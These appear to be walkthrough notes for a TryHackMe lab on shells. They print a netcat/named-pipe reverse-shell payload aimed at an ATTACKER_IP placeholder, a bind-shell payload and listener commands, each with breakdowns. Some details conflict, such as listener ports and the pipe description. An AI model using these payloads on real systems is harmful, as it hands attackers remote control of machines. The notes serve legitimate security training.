# TryHackMe — Shells Overview walkthrough

Room URL: 

---
#  Shell Overview

## What is a Shell?

A **shell** is software that allows a user to interact with an operating system. It can be a **graphical interface**, but is most commonly a **command-line interface (CLI)** — depending on the OS running on the target system.


## Shell in Cybersecurity

In cybersecurity, a shell often refers to a **remote command-line session** that an **attacker uses** after gaining access to a compromised system. This shell allows attackers to **execute commands and run software remotely**.


##  Common Attacker Activities with a Shell

### 1. Remote System Control
- Enables the attacker to execute commands or software **remotely** on the target system.

### 2. Privilege Escalation
- If the attacker gains **limited access**, they can attempt to **escalate privileges** to gain administrative or root access.

### 3. Data Exfiltration
- Attackers can **read and extract sensitive data** from the target system using shell commands.

### 4. Persistence & Maintaining Access
- Attackers can create **backdoors**, add new users or credentials, or install tools to **keep access** for later.

### 5. Post-Exploitation Activities
- Once a shell is established, attackers can:
  - Deploy malware
  - Create hidden users
  - Delete or manipulate files

### 6. Pivoting (Accessing Other Systems)
- Shell access can serve as a **pivot point** to move through the network and target other systems. This process is known as **pivoting**.

Understanding how attackers use shells helps defenders **detect**, **analyze**, and **prevent** further exploitation.



---
# Reverse Shell Notes

A **Reverse Shell**, also called a "connect-back shell," is a commonly used technique in cyberattacks to gain access to a victim machine.


## What Is a Reverse Shell?

A reverse shell causes the **target machine to initiate a connection** back to the attacker's machine. This technique:
- **Bypasses firewalls**, as many allow outbound connections but block incoming ones.
- Enables the attacker to execute commands remotely.


## How Reverse Shells Work

The attacker uses a tool (like **Netcat**) to listen on a port, waiting for the target to connect back.

### Set up a Netcat Listener
```bash
nc -lvnp 443
```

### Explanation of Netcat Command
- `-l`: Listen for incoming connections
- `-v`: Verbose mode (gives feedback)
- `-n`: Avoid DNS lookup
- `-p 443`: Use port 443 to listen (can be any port)

**Commonly used ports for reverse shells**: 53, 80, 443, 139, 445 — to blend in with normal traffic.


## Gaining Reverse Shell Access

Once the listener is ready, the attacker needs to **execute a reverse shell payload** on the victim machine.

### Example Payload: Pipe Reverse Shell
```bash
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc ATTACKER_IP ATTACKER_PORT >/tmp/f
```
###  What Is a Pipe Reverse Shell?
A pipe reverse shell is a type of shell that uses named pipes (FIFOs) to communicate between the attacker's machine and the target system, typically over an existing connection (like TCP). It's one of the stealthier ways to gain remote access to a target because it can avoid using full-blown shell binaries or obvious command-line interaction.

### How It Works (Conceptual Flow)
1. On the target system:
  - Create two named pipes (e.g., `/tmp/in` and `/tmp/out`).
  - Redirect shell input from `/tmp/in`.
  - Redirect shell output to `/tmp/out`.
2. On the attacker’s side:
  - Maintain a connection that sends commands into /tmp/in.
  - Reads output from `/tmp/out`.

#### Payload Breakdown
- `rm -f /tmp/f` – Remove existing named pipe at `/tmp/f`
- `mkfifo /tmp/f` – Create a **named pipe** at `/tmp/f`
- `cat /tmp/f` – Read input from the pipe
- `| sh -i 2>&1` – Pipe input into an interactive shell; redirect error to output
- `| nc ATTACKER_IP ATTACKER_PORT` – Send shell I/O to attacker
- `>/tmp/f` – Write shell output back into pipe to maintain 2-way communication


## Attacker Receives the Shell

```bash
attacker@kali:~$ nc -lvnp 443
listening on [any] 443 ...
connect to [10.4.99.209] from (UNKNOWN) [10.10.13.37] 59964
To run a command as administrator (user "root"), use "sudo ".
See "man sudo_root" for details.

target@tryhackme:~$
```

The attacker now has full shell access to the compromised machine.

---
# Bind Shell 

## Bind Shell

A **bind shell** opens a listening port on the target machine. The attacker connects to this port to get a shell, allowing remote command execution. This approach is used when the target cannot initiate outbound connections.

### How Bind Shell Works

The following payload sets up a bind shell on the target:

```bash
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | bash -i 2>&1 | nc -l 0.0.0.0 8080 > /tmp/f
```

### Breakdown of the Payload

- `rm -f /tmp/f`  
  Removes any existing named pipe (`/tmp/f`) to avoid conflicts.

- `mkfifo /tmp/f`  
  Creates a named pipe (FIFO) at `/tmp/f`. This pipe will be used for bidirectional data flow.

- `cat /tmp/f`  
  Reads input from the named pipe.

- `| bash -i 2>&1`  
  Sends the input to an interactive bash shell. The `2>&1` redirects standard error to standard output, so all output (stdout + stderr) is captured.

- `| nc -l 0.0.0.0 8080`  
  Starts a Netcat listener on all interfaces (`0.0.0.0`) at port `8080`. When an attacker connects to this port, the shell session is exposed.

- `> /tmp/f`  
  Writes the shell output back to the named pipe for sending to the attacker.

### Use on Target Machine

```bash
target@tryhackme:~$ rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | bash -i 2>&1 | nc -l 0.0.0.0 8080 > /tmp/f
```

### Use on Attacker Machine

To connect to the bind shell:

```bash
nc -nv TARGET_IP 8080
```

**Explanation:**
- `nc` starts Netcat.
- `-n` disables DNS resolution.
- `-v` enables verbose mode.
- `TARGET_IP` is the IP of the target machine.
- `8080` is the listening port.


## Pipe Reverse Shell

In contrast to the bind shell, a **reverse shell** initiates a connection from the target to the attacker's system. The attacker sets up a listener, and the target machine connects back to it.

The pipe technique is used to emulate bidirectional communication using named pipes (FIFOs). This can be used in either bind or reverse shells. In the bind shell example above, we used the named pipe `/tmp/f` to handle both input and output.

This method is popular in restricted environments because it avoids complex tools and uses only bash and Netcat, which are often pre-installed.

---

# Shell Listeners

As we learned in previous tasks, a reverse shell will connect from the compromised target to the attacker’s machine. A utility like Netcat will handle the connection and allow the attacker to interact with the exposed shell, but Netcat is not the only utility that will allow us to do that.

Let’s explore some tools that can be used as listeners to interact with an incoming shell.


## Rlwrap

It is a small utility that uses the GNU readline library to provide editing keyboard and history.

**Usage Example (Enhancing a Netcat Shell With Rlwrap):**
```bash
attacker@kali:~$ rlwrap nc -lvnp 443
listening on [any] 443 ...
```

This wraps `nc` with `rlwrap`, allowing the use of features like arrow keys and history for better interaction.


## Ncat

Ncat is an improved version of Netcat distributed by the NMAP project. It provides extra features, like encryption (SSL).

**Usage Example (Listening for Reverse Shells):**
```bash
attacker@kali:~$ ncat -lvnp 4444
Ncat: Version 7.94SVN ( https://nmap.org/ncat )
Ncat: Listening on [::]:443
Ncat: Listening on 0.0.0.0:443
```

**Usage Example (Listening for Reverse Shells with SSL):**
```bash
attacker@kali:~$ ncat --ssl -lvnp 4444
Ncat: Version 7.94SVN ( https://nmap.org/ncat )
Ncat: Generating a temporary 2048-bit RSA key. Use --ssl-key and --ssl-cert to use a permanent one.
Ncat: SHA-1 fingerprint: B7AC F999 7FB0 9FF9 14F5 5F12 6A17 B0DC B094 AB7F
Ncat: Listening on [::]:443
Ncat: Listening on 0.0.0.0:443
```

The `--ssl` option enables SSL encryption for the listener.


## Socat

It is a utility that allows you to create a socket connection between two data sources, in this case, two different hosts.

**Default Usage Example (Listening for Reverse Shell):**
```bash
attacker@kali:~$ socat -d -d TCP-LISTEN:443 STDOUT
2024/09/23 15:44:38 socat[41135] N listening on AF=2 0.0.0.0:443
```

The command above used the `-d` option to enable verbose output; using it again (`-d -d`) will increase the verbosity of the commands. The `TCP-LISTEN:443` option creates a TCP listener on port 443, establishing a server socket for incoming connections. Finally, the `STDOUT` option directs any incoming data to the terminal.


